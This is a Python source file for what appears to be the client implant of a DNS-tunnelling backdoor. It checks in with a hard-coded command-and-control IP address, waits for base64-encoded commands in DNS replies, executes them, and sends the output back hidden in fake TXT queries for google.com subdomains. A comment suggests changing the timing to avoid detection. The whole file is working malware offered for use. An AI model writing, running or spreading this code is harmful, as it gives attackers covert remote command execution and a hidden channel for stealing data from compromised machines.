import signal
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
import base64
import shlex
import subprocess
from time import sleep

c2_addr = "16.171.34.132"


def run_command(cmd):
    if cmd == "exit":
        print("Exit received\nExiting...")
        exit(0)

    cmd = shlex.split(cmd)
    output = subprocess.check_output(cmd)

    chunks_output = [output[i:i+3] for i in range(0, len(output), 3)]
    pkts_to_send = str(len(chunks_output))
    output_pkt_amount = IP(dst=c2_addr) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=pkts_to_send + ".google.com",
                                                                             qtype="TXT"))
    send(output_pkt_amount, verbose=False)
    sleep(1)

    for i in range(0, len(chunks_output)):
        chunks_output[i] = base64.b64encode(chunks_output[i])

    for i in range(0, len(chunks_output)):
        output_pkt = IP(dst=c2_addr) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=chunks_output[i] + b".google.com",
                                                                          qtype="TXT"))
        send(output_pkt, verbose=False)
        sleep(1)  # Change as you wish to not get detected !

    sleep(1)
    done_pkt = IP(dst=c2_addr) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="done" + ".google.com",
                                                                    qtype="TXT"))
    send(done_pkt, verbose=False)


def signal_handler(sig, frame):
    print(f"\nSIGINT received.\nExiting...")
    exit(0)


if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    acknowledged = False
    init_msg = base64.b64encode(b"zombie")
    query = IP(dst=c2_addr) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=init_msg + b".google.com", qtype="TXT"))
    send(query, verbose=False)

    while True:
        answers = sniff(filter=f"udp port 53 and src {c2_addr}", count=1)
        for packet in answers:
            run_command(base64.b64decode(packet[DNS].an.rdata[0]).decode())
